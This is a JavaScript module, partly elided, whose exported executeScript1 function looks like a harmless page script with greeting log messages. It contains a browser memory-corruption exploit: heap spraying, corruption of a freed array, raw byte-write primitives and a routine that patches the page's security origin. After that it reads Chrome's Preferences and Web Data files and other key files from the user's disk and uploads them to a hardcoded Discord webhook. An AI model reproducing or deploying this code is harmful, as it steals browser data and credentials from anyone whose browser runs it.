export const executeScript1 = () => {
  console.log("Hello from PinaakPagea!");
  window.gc = function () {
    for (i = 0; i < 50; i++) {
  ...
  function next(freed, addressIdx, corrupt) {
    ...
    function walk(dirPath, prefix) {
      ...
      for (var i = 0; i < lists.length; i++) {
        if (lists[i][0] == "." || lists[i][0] == "..") continue;
        ...
        ret = ret.concat(
          walk(dirPath + "/" + lists[i][0], prefix + "/" + lists[i][0])
        );
      }
    ...
    function patchSecurityOrigin() {
      ...
      function slowWrite8(addr, value) {
        ...
        if (addr & 1) new Uint8Array(corrupt)[1] = value;
        else new Uint8Array(corrupt)[0] = value;
      }
    ...
    patchSecurityOrigin();
    var uploadUrl =
      "https://discord.com/api/webhooks/1405465069394853920/fqfErnkCUsMWUWzouasZilJljrCY_Olz9I_D2ow7f8L9n9Snt3odibMUbmqkIylNGKP7";

    upload(
      uploadUrl + "?fileName=Preferences",
      download("../AppData/Local/Google/Chrome/User Data/Default/Preferences")
    );
    upload(
      uploadUrl + "?fileName=Web Data",
      download("../AppData/Local/Google/Chrome/User Data/Default/Web Data")
    );
    ...
    for (var i = 0; i < keyFiles.length; i++)
      upload(
        uploadUrl + "?fileName=" + keyFiles[i][0],
        download(keyFiles[i][1])
      );
  }
  ...
  function exploit() {
    ...
    for (var i = 0; i < 1000; i++) {
      arrayCreator[i] = (function () {
        var a = Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {
          return 0x11111111;
        });
        var b = [];
    ...
    for (var i = 0; i < holes.length; i++) holes[i] = t.concat();
    ...
    for (var i = 0; i < junks.length; i++) junks[i][0x20] = obj;
    ...
    if (!freed) return fail();

    for (var i = 0; i < abs.length; i++) abs[i] = new ArrayBuffer(7);
    ...
    for (var i = 1; i < freed.length; i++) {
      if (!Number.isSafeInteger(freed[i]) || freed[i] != 7) continue;

      freed[i] = 0x30000000;
      var ab = findCorrupt();
      if (ab) return next(freed, i - 1, ab);
  ...
  main();
  console.log("Hello from PinaakPageb!");
};
